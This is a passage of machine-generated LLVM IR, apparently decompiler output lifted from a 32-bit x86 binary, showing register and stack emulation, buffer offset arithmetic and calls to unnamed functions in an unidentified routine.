  %v11_8049559 = icmp eq i32 %v2_8049559, 1
  store i1 %v11_8049559, i1* %zf.global-to-local, align 1
  br i1 %v11_8049559, label %dec_label_pc_8049636, label %dec_label_pc_8049562

dec_label_pc_8049562:                             ; preds = %dec_label_pc_8049550, %dec_label_pc_8049636, %dec_label_pc_80495dc
  %v0_8049562 = load i32, i32* @esp, align 4
  %v1_8049562 = add i32 %v0_8049562, 92
  %v2_8049562 = inttoptr i32 %v1_8049562 to i32*
  %v3_8049562 = load i32, i32* %v2_8049562, align 4
  store i32 %v3_8049562, i32* %ecx.global-to-local, align 4
  %v1_8049566 = add i32 %v3_8049562, 12
  %v2_8049566 = inttoptr i32 %v1_8049566 to i32*
  %v3_8049566 = load i32, i32* %v2_8049566, align 4
  store i32 %v3_8049566, i32* %eax.global-to-local, align 4
  %v1_8049569 = icmp eq i32 %v3_8049566, 0
  store i1 %v1_8049569, i1* %zf.global-to-local, align 1
  %v1_804956b = icmp eq i1 %v1_8049569, false
  br i1 %v1_804956b, label %dec_label_pc_804958e, label %dec_label_pc_804956d

dec_label_pc_804956d:                             ; preds = %dec_label_pc_8049562
  %v1_804956d = add i32 %v3_8049562, 8
  %v2_804956d = inttoptr i32 %v1_804956d to i32*
  %v3_804956d = load i32, i32* %v2_804956d, align 4
  %v12_804956d = icmp eq i32 %v3_804956d, 1
  store i1 %v12_804956d, i1* %zf.global-to-local, align 1
  br i1 %v12_804956d, label %dec_label_pc_80496da, label %dec_label_pc_8049577

dec_label_pc_8049577:                             ; preds = %dec_label_pc_804956d
  %v3_8049577 = load i32, i32* %v2_8049562, align 4
  store i32 %v3_8049577, i32* %ecx.global-to-local, align 4
  %v1_804957b = add i32 %v3_8049577, 660
  %v2_804957b = inttoptr i32 %v1_804957b to i32*
  %v3_804957b = load i32, i32* %v2_804957b, align 4
  %v1_8049581 = load i32, i32* @ebx, align 4
  %v2_8049581 = sub i32 %v3_804957b, %v1_8049581
  %v12_8049581 = icmp eq i32 %v2_8049581, 0
  store i32 %v2_8049581, i32* %eax.global-to-local, align 4
  %v2_8049583 = add i32 %v3_8049577, 12
  %v3_8049583 = inttoptr i32 %v2_8049583 to i32*
  store i32 %v2_8049581, i32* %v3_8049583, align 4
  store i1 %v12_8049581, i1* %zf.global-to-local, align 1
  br i1 %v12_8049581, label %dec_label_pc_8049af8, label %dec_label_pc_804958e

dec_label_pc_804958e:                             ; preds = %dec_label_pc_8049577, %dec_label_pc_8049562, %dec_label_pc_80496da, %dec_label_pc_8049764
  %v0_804958e = load i32, i32* @ebx, align 4
  %v1_804958e = icmp eq i32 %v0_804958e, 0
  store i1 %v1_804958e, i1* %zf.global-to-local, align 1
  br i1 %v1_804958e, label %dec_label_pc_80495e0, label %dec_label_pc_8049592

dec_label_pc_8049592:                             ; preds = %dec_label_pc_804958e
  %v0_8049592 = load i32, i32* @esp, align 4
  %v1_8049592 = add i32 %v0_8049592, 92
  %v2_8049592 = inttoptr i32 %v1_8049592 to i32*
  %v3_8049592 = load i32, i32* %v2_8049592, align 4
  store i32 %v3_8049592, i32* %edx.global-to-local, align 4
  %v1_8049596 = add i32 %v3_8049592, 660
  %v2_8049596 = inttoptr i32 %v1_8049596 to i32*
  %v3_8049596 = load i32, i32* %v2_8049596, align 4
  %v2_804959c = sub i32 %v3_8049596, %v0_804958e
  %v12_804959c = icmp eq i32 %v2_804959c, 0
  store i1 %v12_804959c, i1* %zf.global-to-local, align 1
  store i32 %v2_804959c, i32* %eax.global-to-local, align 4
  store i32 %v2_804959c, i32* %v2_8049596, align 4
  %v0_80495a4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80495a4 = load i32, i32* @esp, align 4
  %v2_80495a4 = add i32 %v1_80495a4, -4
  %v3_80495a4 = inttoptr i32 %v2_80495a4 to i32*
  store i32 %v0_80495a4, i32* %v3_80495a4, align 4
  %v0_80495a5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80495a5 = add i32 %v1_80495a4, -8
  %v3_80495a5 = inttoptr i32 %v2_80495a5 to i32*
  store i32 %v0_80495a5, i32* %v3_80495a5, align 4
  %v0_80495a6 = load i32, i32* @esi, align 4
  %v1_80495a6 = load i32, i32* @ebx, align 4
  %v2_80495a6 = add i32 %v1_80495a6, %v0_80495a6
  store i32 %v2_80495a6, i32* %eax.global-to-local, align 4
  %v2_80495a9 = add i32 %v1_80495a4, -12
  %v3_80495a9 = inttoptr i32 %v2_80495a9 to i32*
  store i32 %v2_80495a6, i32* %v3_80495a9, align 4
  %v0_80495aa = load i32, i32* @esi, align 4
  %v2_80495aa = add i32 %v1_80495a4, -16
  %v3_80495aa = inttoptr i32 %v2_80495aa to i32*
  store i32 %v0_80495aa, i32* %v3_80495aa, align 4
  %v4_80495ab = call i32 @function_8053123(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80495ab, i32* %eax.global-to-local, align 4
  %v0_80495b0 = load i32, i32* @esp, align 4
  %v1_80495b0 = add i32 %v0_80495b0, 108
  %v2_80495b0 = inttoptr i32 %v1_80495b0 to i32*
  %v3_80495b0 = load i32, i32* %v2_80495b0, align 4
  store i32 %v3_80495b0, i32* %ecx.global-to-local, align 4
  %v1_80495b4 = add i32 %v0_80495b0, 92
  %v2_80495b4 = inttoptr i32 %v1_80495b4 to i32*
  %v3_80495b4 = load i32, i32* %v2_80495b4, align 4
  store i32 %v3_80495b4, i32* %edx.global-to-local, align 4
  %v1_80495b8 = add i32 %v3_80495b0, 660
  %v2_80495b8 = inttoptr i32 %v1_80495b8 to i32*
  %v3_80495b8 = load i32, i32* %v2_80495b8, align 4
  store i32 %v3_80495b8, i32* %eax.global-to-local, align 4
  %v1_80495c1 = icmp eq i32 %v3_80495b8, 0
  store i1 %v1_80495c1, i1* %zf.global-to-local, align 1
  %v2_80495c3 = add i32 %v3_80495b4, 2116
  %v3_80495c3 = add i32 %v2_80495c3, %v3_80495b8
  %v4_80495c3 = inttoptr i32 %v3_80495c3 to i8*
  store i8 0, i8* %v4_80495c3, align 1
  %v0_80495cb = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80495cb, label %dec_label_pc_80495e0, label %dec_label_pc_80495cd

dec_label_pc_80495cd:                             ; preds = %dec_label_pc_8049592
  %v0_80495cd = load i32, i32* @esp, align 4
  %v1_80495cd = add i32 %v0_80495cd, 92
  %v2_80495cd = inttoptr i32 %v1_80495cd to i32*
  %v3_80495cd = load i32, i32* %v2_80495cd, align 4
  store i32 %v3_80495cd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80495d1

dec_label_pc_80495d1:                             ; preds = %dec_label_pc_8049521, %dec_label_pc_80495cd
  %v0_8049542 = phi i32 [ %v0_80495d1.pre, %dec_label_pc_8049521 ], [ %v3_80495cd, %dec_label_pc_80495cd ]
  %v1_80495d1 = add i32 %v0_8049542, 12
  %v2_80495d1 = inttoptr i32 %v1_80495d1 to i32*
  %v3_80495d1 = load i32, i32* %v2_80495d1, align 4
  store i32 %v3_80495d1, i32* %eax.global-to-local, align 4
  %v1_80495d4 = icmp eq i32 %v3_80495d1, 0
  store i1 %v1_80495d4, i1* %zf.global-to-local, align 1
  %tmp145 = icmp slt i32 %v3_80495d1, 1
  %tmp146 = icmp eq i1 %tmp145, false
  br i1 %tmp146, label %dec_label_pc_8049542, label %dec_label_pc_80495dc

dec_label_pc_80495dc:                             ; preds = %dec_label_pc_80495d1
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8049562

dec_label_pc_80495e0:                             ; preds = %dec_label_pc_8049592, %dec_label_pc_804958e
  %v0_80495e0 = load i32, i32* @esp, align 4
  %v1_80495e0 = add i32 %v0_80495e0, 92
  %v2_80495e0 = inttoptr i32 %v1_80495e0 to i32*
  %v3_80495e0 = load i32, i32* %v2_80495e0, align 4
  store i32 %v3_80495e0, i32* %eax.global-to-local, align 4
  %v1_80495e4 = add i32 %v3_80495e0, -1448
  %v2_80495e4 = inttoptr i32 %v1_80495e4 to i8*
  %v3_80495e4 = load i8, i8* %v2_80495e4, align 1
  %v12_80495e4 = icmp eq i8 %v3_80495e4, 7
  store i1 %v12_80495e4, i1* %zf.global-to-local, align 1
  %v1_80495eb = icmp eq i1 %v12_80495e4, false
  br i1 %v1_80495eb, label %dec_label_pc_8048d91, label %dec_label_pc_80495f1

dec_label_pc_80495f1:                             ; preds = %dec_label_pc_80495e0
  %v3_80495f1 = load i32, i32* %v2_80495e0, align 4
  store i32 %v3_80495f1, i32* %edx.global-to-local, align 4
  %v1_80495f5 = add i32 %v3_80495f1, 660
  %v2_80495f5 = inttoptr i32 %v1_80495f5 to i32*
  %v3_80495f5 = load i32, i32* %v2_80495f5, align 4
  %v9_80495f5 = icmp eq i32 %v3_80495f5, 1024
  store i1 %v9_80495f5, i1* %zf.global-to-local, align 1
  %v1_80495ff = icmp eq i1 %v9_80495f5, false
  br i1 %v1_80495ff, label %dec_label_pc_80494dc, label %dec_label_pc_8049605

dec_label_pc_8049605:                             ; preds = %dec_label_pc_80495f1, %dec_label_pc_80494af
  %v1_8049605 = phi i32 [ %v0_80494b4, %dec_label_pc_80494af ], [ %v0_80495e0, %dec_label_pc_80495f1 ]
  %v0_8049605 = phi i32 [ %v1_80494af, %dec_label_pc_80494af ], [ %v3_80495e0, %dec_label_pc_80495f1 ]
  %v2_8049605 = add i32 %v1_8049605, -4
  %v3_8049605 = inttoptr i32 %v2_8049605 to i32*
  store i32 %v0_8049605, i32* %v3_8049605, align 4
  %v1_8049606 = add i32 %v1_8049605, -8
  %v2_8049606 = inttoptr i32 %v1_8049606 to i32*
  store i32 960, i32* %v2_8049606, align 4
  %v1_804960b = add i32 %v1_8049605, 76
  %v2_804960b = inttoptr i32 %v1_804960b to i32*
  %v3_804960b = load i32, i32* %v2_804960b, align 4
  %v1_804960f = add i32 %v3_804960b, 2180
  %v9_804960f = icmp eq i32 %v1_804960f, 0
  store i1 %v9_804960f, i1* %zf.global-to-local, align 1
  store i32 %v1_804960f, i32* %eax.global-to-local, align 4
  %v2_8049614 = add i32 %v1_8049605, -12
  %v3_8049614 = inttoptr i32 %v2_8049614 to i32*
  store i32 %v1_804960f, i32* %v3_8049614, align 4
  %v0_8049615 = load i32, i32* @esi, align 4
  %v2_8049615 = add i32 %v1_8049605, -16
  %v3_8049615 = inttoptr i32 %v2_8049615 to i32*
  store i32 %v0_8049615, i32* %v3_8049615, align 4
  %v4_8049616 = call i32 @function_8053123(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049616, i32* %eax.global-to-local, align 4
  %v0_804961b = load i32, i32* @esp, align 4
  %v1_804961b = add i32 %v0_804961b, 108
  %v2_804961b = inttoptr i32 %v1_804961b to i32*
  %v3_804961b = load i32, i32* %v2_804961b, align 4
  store i32 %v3_804961b, i32* %ecx.global-to-local, align 4
  %v1_804961f = add i32 %v3_804961b, 660
  %v2_804961f = inttoptr i32 %v1_804961f to i32*
  %v3_804961f = load i32, i32* %v2_804961f, align 4
  %v1_8049628 = add i32 %v3_804961f, -64
  %v6_8049628 = icmp eq i32 %v1_8049628, 0
  store i1 %v6_8049628, i1* %zf.global-to-local, align 1
  store i32 %v1_8049628, i32* %eax.global-to-local, align 4
  store i32 %v1_8049628, i32* %v2_804961f, align 4
  %v0_80494dc.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80494dc

dec_label_pc_8049636:                             ; preds = %dec_label_pc_8049550
  %v0_8049636 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049636 = load i32, i32* @esp, align 4
  %v2_8049636 = add i32 %v1_8049636, -4
  %v3_8049636 = inttoptr i32 %v2_8049636 to i32*
  store i32 %v0_8049636, i32* %v3_8049636, align 4
  %v0_8049637 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049637 = add i32 %v1_8049636, -8
  %v3_8049637 = inttoptr i32 %v2_8049637 to i32*
  store i32 %v0_8049637, i32* %v3_8049637, align 4
  %v1_8049638 = add i32 %v1_8049636, -12
  %v2_8049638 = inttoptr i32 %v1_8049638 to i32*
  store i32 0, i32* %v2_8049638, align 4
  %v1_804963a = add i32 %v1_8049636, -16
  %v2_804963a = inttoptr i32 %v1_804963a to i32*
  store i32 36, i32* %v2_804963a, align 4
  %v3_804963c = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804963c, i32* %eax.global-to-local, align 4
  %v0_8049641 = load i32, i32* @esp, align 4
  %v1_8049641 = add i32 %v0_8049641, -4
  %v2_8049641 = inttoptr i32 %v1_8049641 to i32*
  store i32 11, i32* %v2_8049641, align 4
  %v2_8049643 = add i32 %v0_8049641, -8
  %v3_8049643 = inttoptr i32 %v2_8049643 to i32*
  store i32 %v3_804963c, i32* %v3_8049643, align 4
  %v1_8049644 = add i32 %v0_8049641, 108
  %v2_8049644 = inttoptr i32 %v1_8049644 to i32*
  %v3_8049644 = load i32, i32* %v2_8049644, align 4
  store i32 %v3_8049644, i32* %ecx.global-to-local, align 4
  %v1_8049648 = add i32 %v3_8049644, 660
  %v2_8049648 = inttoptr i32 %v1_8049648 to i32*
  %v3_8049648 = load i32, i32* %v2_8049648, align 4
  store i32 %v3_8049648, i32* %eax.global-to-local, align 4
  %v2_804964e = add i32 %v0_8049641, -12
  %v3_804964e = inttoptr i32 %v2_804964e to i32*
  store i32 %v3_8049648, i32* %v3_804964e, align 4
  %v0_804964f = load i32, i32* @esi, align 4
  %v2_804964f = add i32 %v0_8049641, -16
  %v3_804964f = inttoptr i32 %v2_804964f to i32*
  store i32 %v0_804964f, i32* %v3_804964f, align 4
  %v0_8049650 = call i32 @function_80526d0()
  %v0_8049655 = load i32, i32* @esp, align 4
  %v1_8049658 = add i32 %v0_8049650, 1
  %v8_8049658 = icmp eq i32 %v1_8049658, 0
  store i1 %v8_8049658, i1* %zf.global-to-local, align 1
  store i32 %v1_8049658, i32* %eax.global-to-local, align 4
  br i1 %v8_8049658, label %dec_label_pc_8049562, label %dec_label_pc_804965f

dec_label_pc_804965f:                             ; preds = %dec_label_pc_8049636
  %v2_804965f = add i32 %v0_8049655, 28
  %v3_804965f = inttoptr i32 %v2_804965f to i32*
  store i32 %v1_8049658, i32* %v3_804965f, align 4
  %v0_8049660 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049660 = add i32 %v0_8049655, 24
  %v3_8049660 = inttoptr i32 %v2_8049660 to i32*
  store i32 %v0_8049660, i32* %v3_8049660, align 4
  %v1_8049661 = add i32 %v0_8049655, 20
  %v2_8049661 = inttoptr i32 %v1_8049661 to i32*
  store i32 0, i32* %v2_8049661, align 4
  %v1_8049663 = add i32 %v0_8049655, 16
  %v2_8049663 = inttoptr i32 %v1_8049663 to i32*
  store i32 36, i32* %v2_8049663, align 4
  %v3_8049665 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049665, i32* %eax.global-to-local, align 4
  %v0_804966a = load i32, i32* @esp, align 4
  %v1_804966a = add i32 %v0_804966a, -4
  %v2_804966a = inttoptr i32 %v1_804966a to i32*
  store i32 11, i32* %v2_804966a, align 4
  %v2_804966c = add i32 %v0_804966a, -8
  %v3_804966c = inttoptr i32 %v2_804966c to i32*
  store i32 %v3_8049665, i32* %v3_804966c, align 4
  %v1_804966d = add i32 %v0_804966a, 108
  %v2_804966d = inttoptr i32 %v1_804966d to i32*
  %v3_804966d = load i32, i32* %v2_804966d, align 4
  store i32 %v3_804966d, i32* %eax.global-to-local, align 4
  %v1_8049671 = add i32 %v3_804966d, 660
  %v2_8049671 = inttoptr i32 %v1_8049671 to i32*
  %v3_8049671 = load i32, i32* %v2_8049671, align 4
  store i32 %v3_8049671, i32* %eax.global-to-local, align 4
  %v2_8049677 = add i32 %v0_804966a, -12
  %v3_8049677 = inttoptr i32 %v2_8049677 to i32*
  store i32 %v3_8049671, i32* %v3_8049677, align 4
  %v0_8049678 = load i32, i32* @esi, align 4
  %v2_8049678 = add i32 %v0_804966a, -16
  %v3_8049678 = inttoptr i32 %v2_8049678 to i32*
  store i32 %v0_8049678, i32* %v3_8049678, align 4
  %v0_8049679 = call i32 @function_80526d0()
  store i32 %v0_8049679, i32* %eax.global-to-local, align 4
  %v0_804967e = load i32, i32* @esp, align 4
  %v1_8049681 = add i32 %v0_804967e, 28
  %v2_8049681 = inttoptr i32 %v1_8049681 to i32*
  store i32 1, i32* %v2_8049681, align 4
  %v1_8049683 = add i32 %v0_804967e, 24
  %v2_8049683 = inttoptr i32 %v1_8049683 to i32*
  store i32 ptrtoint (i32* @global_var_80554fa.16 to i32), i32* %v2_8049683, align 4
  %v1_8049688 = add i32 %v0_804967e, 124
  %v2_8049688 = inttoptr i32 %v1_8049688 to i32*
  %v3_8049688 = load i32, i32* %v2_8049688, align 4
  store i32 %v3_8049688, i32* %edx.global-to-local, align 4
  store i32 %v0_8049679, i32* @ebx, align 4
  %v0_804968e = load i32, i32* @esi, align 4
  %v2_804968e = add i32 %v0_804968e, %v0_8049679
  store i32 %v2_804968e, i32* @edi, align 4
  %v1_8049691 = add i32 %v3_8049688, 660
  %v2_8049691 = inttoptr i32 %v1_8049691 to i32*
  %v3_8049691 = load i32, i32* %v2_8049691, align 4
  %v2_8049697 = sub i32 %v3_8049691, %v0_8049679
  %v12_8049697 = icmp eq i32 %v2_8049697, 0
  store i1 %v12_8049697, i1* %zf.global-to-local, align 1
  store i32 %v2_8049697, i32* %eax.global-to-local, align 4
  %v2_8049699 = add i32 %v0_804967e, 20
  %v3_8049699 = inttoptr i32 %v2_8049699 to i32*
  store i32 %v2_8049697, i32* %v3_8049699, align 4
  %v0_804969a = load i32, i32* @edi, align 4
  %v2_804969a = add i32 %v0_804967e, 16
  %v3_804969a = inttoptr i32 %v2_804969a to i32*
  store i32 %v0_804969a, i32* %v3_804969a, align 4
  %v0_804969b = call i32 @function_80526d0()
  store i32 %v0_804969b, i32* %eax.global-to-local, align 4
  %v0_80496a0 = load i32, i32* @esp, align 4
  %v1_80496a0 = add i32 %v0_80496a0, 92
  %v2_80496a0 = inttoptr i32 %v1_80496a0 to i32*
  %v3_80496a0 = load i32, i32* %v2_80496a0, align 4
  store i32 %v3_80496a0, i32* %ecx.global-to-local, align 4
  %v0_80496a4 = load i32, i32* @ebx, align 4
  %v2_80496a4 = add i32 %v0_80496a4, %v0_804969b
  store i32 %v2_80496a4, i32* @ebx, align 4
  %v2_80496a6 = add i32 %v0_80496a0, 56
  %v3_80496a6 = inttoptr i32 %v2_80496a6 to i32*
  store i32 %v2_80496a4, i32* %v3_80496a6, align 4
  %v0_80496ad = load i32, i32* @ebx, align 4
  %v1_80496ad = load i32, i32* %ecx.global-to-local, align 4
  %v2_80496ad = add i32 %v0_80496ad, 2115
  %v3_80496ad = add i32 %v2_80496ad, %v1_80496ad
  %v4_80496ad = inttoptr i32 %v3_80496ad to i8*
  store i8 0, i8* %v4_80496ad, align 1
  %v0_80496b5 = load i32, i32* @esp, align 4
  %v1_80496b5 = add i32 %v0_80496b5, 92
  %v2_80496b5 = inttoptr i32 %v1_80496b5 to i32*
  %v3_80496b5 = load i32, i32* %v2_80496b5, align 4
  store i32 %v3_80496b5, i32* %eax.global-to-local, align 4
  %v1_80496b9 = add i32 %v3_80496b5, 16
  %v2_80496b9 = inttoptr i32 %v1_80496b9 to i32*
  %v3_80496b9 = load i32, i32* %v2_80496b9, align 4
  %v4_80496b9 = add i32 %v3_80496b9, -4
  %v9_80496b9 = sub i32 3, %v3_80496b9
  %v10_80496b9 = and i32 %v9_80496b9, %v3_80496b9
  %v11_80496b9 = icmp slt i32 %v10_80496b9, 0
  %v12_80496b9 = icmp eq i32 %v4_80496b9, 0
  store i1 %v12_80496b9, i1* %zf.global-to-local, align 1
  %v13_80496b9 = icmp slt i32 %v4_80496b9, 0
  %v3_80496bd = icmp ne i1 %v13_80496b9, %v11_80496b9
  %v4_80496bd = or i1 %v12_80496b9, %v3_80496bd
  br i1 %v4_80496bd, label %dec_label_pc_8049da3, label %dec_label_pc_80496c3

dec_label_pc_80496c3:                             ; preds = %dec_label_pc_8049da3, %dec_label_pc_804965f, %dec_label_pc_8049db8
  %v0_80496c3 = phi i32 [ %v1_8049dac, %dec_label_pc_8049da3 ], [ %v0_80496b5, %dec_label_pc_804965f ], [ %v0_80496c3.pre, %dec_label_pc_8049db8 ]
  %v1_80496c3 = add i32 %v0_80496c3, 92
  %v2_80496c3 = inttoptr i32 %v1_80496c3 to i32*
  %v3_80496c3 = load i32, i32* %v2_80496c3, align 4
  store i32 %v3_80496c3, i32* %edx.global-to-local, align 4
  %v1_80496c7 = add i32 %v3_80496c3, 12
  %v2_80496c7 = inttoptr i32 %v1_80496c7 to i32*
  store i32 -1, i32* %v2_80496c7, align 4
  %v0_80496ce = load i32, i32* %edx.global-to-local, align 4
  %v1_80496ce = add i32 %v0_80496ce, -1448
  %v2_80496ce = inttoptr i32 %v1_80496ce to i8*
  store i8 10, i8* %v2_80496ce, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_80496da:                             ; preds = %dec_label_pc_804956d
  %v1_80496da = add i32 %v0_8049562, -4
  %v2_80496da = inttoptr i32 %v1_80496da to i32*
  store i32 2, i32* %v2_80496da, align 4
  %v1_80496dc = add i32 %v0_8049562, -8
  %v2_80496dc = inttoptr i32 %v1_80496dc to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v2_80496dc, align 4
  %v0_80496e1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80496e1 = add i32 %v0_80496e1, 660
  %v2_80496e1 = inttoptr i32 %v1_80496e1 to i32*
  %v3_80496e1 = load i32, i32* %v2_80496e1, align 4
  store i32 %v3_80496e1, i32* %eax.global-to-local, align 4
  %v2_80496e7 = add i32 %v0_8049562, -12
  %v3_80496e7 = inttoptr i32 %v2_80496e7 to i32*
  store i32 %v3_80496e1, i32* %v3_80496e7, align 4
  %v0_80496e8 = load i32, i32* @esi, align 4
  %v2_80496e8 = add i32 %v0_8049562, -16
  %v3_80496e8 = inttoptr i32 %v2_80496e8 to i32*
  store i32 %v0_80496e8, i32* %v3_80496e8, align 4
  %v0_80496e9 = call i32 @function_80526d0()
  %v0_80496ee = load i32, i32* @esp, align 4
  %v1_80496f1 = add i32 %v0_80496e9, 1
  %v8_80496f1 = icmp eq i32 %v1_80496f1, 0
  store i1 %v8_80496f1, i1* %zf.global-to-local, align 1
  store i32 %v1_80496f1, i32* %eax.global-to-local, align 4
  br i1 %v8_80496f1, label %dec_label_pc_804958e, label %dec_label_pc_80496f8

dec_label_pc_80496f8:                             ; preds = %dec_label_pc_80496da
  %v1_80496f8 = add i32 %v0_80496ee, 12
  %v2_80496f8 = inttoptr i32 %v1_80496f8 to i32*
  store i32 2, i32* %v2_80496f8, align 4
  %v1_80496fa = add i32 %v0_80496ee, 8
  %v2_80496fa = inttoptr i32 %v1_80496fa to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v2_80496fa, align 4
  %v1_80496ff = add i32 %v0_80496ee, 108
  %v2_80496ff = inttoptr i32 %v1_80496ff to i32*
  %v3_80496ff = load i32, i32* %v2_80496ff, align 4
  store i32 %v3_80496ff, i32* %eax.global-to-local, align 4
  %v1_8049703 = add i32 %v3_80496ff, 660
  %v2_8049703 = inttoptr i32 %v1_8049703 to i32*
  %v3_8049703 = load i32, i32* %v2_8049703, align 4
  %v2_8049709 = add i32 %v0_80496ee, 4
  %v3_8049709 = inttoptr i32 %v2_8049709 to i32*
  store i32 %v3_8049703, i32* %v3_8049709, align 4
  %v0_804970a = load i32, i32* @esi, align 4
  %v3_804970a = inttoptr i32 %v0_80496ee to i32*
  store i32 %v0_804970a, i32* %v3_804970a, align 4
  %v0_804970b = call i32 @function_80526d0()
  store i32 %v0_804970b, i32* %eax.global-to-local, align 4
  %v0_8049710 = load i32, i32* @esp, align 4
  %v1_8049710 = add i32 %v0_8049710, 92
  %v2_8049710 = inttoptr i32 %v1_8049710 to i32*
  %v3_8049710 = load i32, i32* %v2_8049710, align 4
  store i32 %v3_8049710, i32* %edx.global-to-local, align 4
  store i32 %v0_804970b, i32* @ebx, align 4
  %v2_8049716 = add i32 %v0_804970b, 2114
  %v3_8049716 = add i32 %v2_8049716, %v3_8049710
  %v4_8049716 = inttoptr i32 %v3_8049716 to i8*
  store i8 0, i8* %v4_8049716, align 1
  %v0_804971e = load i32, i32* @esp, align 4
  %v1_804971e = add i32 %v0_804971e, -4
  %v2_804971e = inttoptr i32 %v1_804971e to i32*
  store i32 1, i32* %v2_804971e, align 4
  %v1_8049720 = add i32 %v0_804971e, -8
  %v2_8049720 = inttoptr i32 %v1_8049720 to i32*
  store i32 ptrtoint (i32* @global_var_80554e9.14 to i32), i32* %v2_8049720, align 4
  %v2_8049725 = add i32 %v0_804971e, -12
  %v3_8049725 = inttoptr i32 %v2_8049725 to i32*
  store i32 %v0_804970b, i32* %v3_8049725, align 4
  %v0_8049726 = load i32, i32* @esi, align 4
  %v2_8049726 = add i32 %v0_804971e, -16
  %v3_8049726 = inttoptr i32 %v2_8049726 to i32*
  store i32 %v0_8049726, i32* %v3_8049726, align 4
  %v0_8049727 = call i32 @function_80526d0()
  %v0_804972c = load i32, i32* @esp, align 4
  %v1_804972c = add i32 %v0_804972c, 32
  %v1_804972f = add i32 %v0_8049727, 1
  %v8_804972f = icmp eq i32 %v1_804972f, 0
  store i1 %v8_804972f, i1* %zf.global-to-local, align 1
  store i32 %v1_804972f, i32* %eax.global-to-local, align 4
  br i1 %v8_804972f, label %dec_label_pc_804974f, label %dec_label_pc_8049732

dec_label_pc_8049732:                             ; preds = %dec_label_pc_80496f8
  %v1_8049732 = add i32 %v0_804972c, 28
  %v2_8049732 = inttoptr i32 %v1_8049732 to i32*
  store i32 1, i32* %v2_8049732, align 4
  %v1_8049734 = add i32 %v0_804972c, 24
  %v2_8049734 = inttoptr i32 %v1_8049734 to i32*
  store i32 ptrtoint (i32* @global_var_80554e9.14 to i32), i32* %v2_8049734, align 4
  %v0_8049739 = load i32, i32* @ebx, align 4
  %v2_8049739 = add i32 %v0_804972c, 20
  %v3_8049739 = inttoptr i32 %v2_8049739 to i32*
  store i32 %v0_8049739, i32* %v3_8049739, align 4
  %v0_804973a = load i32, i32* @esi, align 4
  %v2_804973a = add i32 %v0_804972c, 16
  %v3_804973a = inttoptr i32 %v2_804973a to i32*
  store i32 %v0_804973a, i32* %v3_804973a, align 4
  %v0_804973b = call i32 @function_80526d0()
  store i32 %v0_804973b, i32* %eax.global-to-local, align 4
  %v0_8049740 = load i32, i32* @esp, align 4
  %v1_8049740 = add i32 %v0_8049740, 92
  %v2_8049740 = inttoptr i32 %v1_8049740 to i32*
  %v3_8049740 = load i32, i32* %v2_8049740, align 4
  store i32 %v3_8049740, i32* @ecx, align 4
  %v6_8049744 = icmp eq i32 %v0_8049740, -16
  store i1 %v6_8049744, i1* %zf.global-to-local, align 1
  %v2_8049747 = add i32 %v0_804973b, 2116
  %v3_8049747 = add i32 %v2_8049747, %v3_8049740
  %v4_8049747 = inttoptr i32 %v3_8049747 to i8*
  store i8 0, i8* %v4_8049747, align 1
  %v1_804974f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804974f

dec_label_pc_804974f:                             ; preds = %dec_label_pc_80496f8, %dec_label_pc_8049732
  %v1_804974f = phi i32 [ %v1_804972c, %dec_label_pc_80496f8 ], [ %v1_804974f.pre, %dec_label_pc_8049732 ]
  %v0_804974f = load i32, i32* @ecx, align 4
  %v2_804974f = add i32 %v1_804974f, -4
  %v3_804974f = inttoptr i32 %v2_804974f to i32*
  store i32 %v0_804974f, i32* %v3_804974f, align 4
  %v0_8049750 = load i32, i32* @ecx, align 4
  %v2_8049750 = add i32 %v1_804974f, -8
  %v3_8049750 = inttoptr i32 %v2_8049750 to i32*
  store i32 %v0_8049750, i32* %v3_8049750, align 4
  %v1_8049751 = add i32 %v1_804974f, -12
  %v2_8049751 = inttoptr i32 %v1_8049751 to i32*
  store i32 16, i32* %v2_8049751, align 4
  %v0_8049753 = load i32, i32* @esi, align 4
  %v2_8049753 = add i32 %v1_804974f, -16
  %v3_8049753 = inttoptr i32 %v2_8049753 to i32*
  store i32 %v0_8049753, i32* %v3_8049753, align 4
  %v3_8049754 = call i32 @function_8052720(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049754, i32* %eax.global-to-local, align 4
  %v0_8049759 = load i32, i32* @esp, align 4
  %v1_804975c = icmp eq i32 %v3_8049754, 0
  store i1 %v1_804975c, i1* %zf.global-to-local, align 1
  %v1_8049e5a = add i32 %v0_8049759, 108
  %v2_8049e5a = inttoptr i32 %v1_8049e5a to i32*
  %v3_8049e5a = load i32, i32* %v2_8049e5a, align 4
  br i1 %v1_804975c, label %dec_label_pc_8049e5a, label %dec_label_pc_8049764

dec_label_pc_8049764:                             ; preds = %dec_label_pc_804974f
  store i32 %v3_8049e5a, i32* %edx.global-to-local, align 4
  %v1_8049768 = add i32 %v3_8049754, 2
  %v9_8049768 = icmp eq i32 %v1_8049768, 0
  store i1 %v9_8049768, i1* %zf.global-to-local, align 1
  store i32 %v1_8049768, i32* %eax.global-to-local, align 4
  %v2_804976b = add i32 %v3_8049e5a, 12
  %v3_804976b = inttoptr i32 %v2_804976b to i32*
  store i32 %v1_8049768, i32* %v3_804976b, align 4
  br label %dec_label_pc_804958e

dec_label_pc_8049773:                             ; preds = %dec_label_pc_804854f
  %v1_8049773 = add i32 %v0_80485a5, -1440
  %v2_8049773 = inttoptr i32 %v1_8049773 to i32*
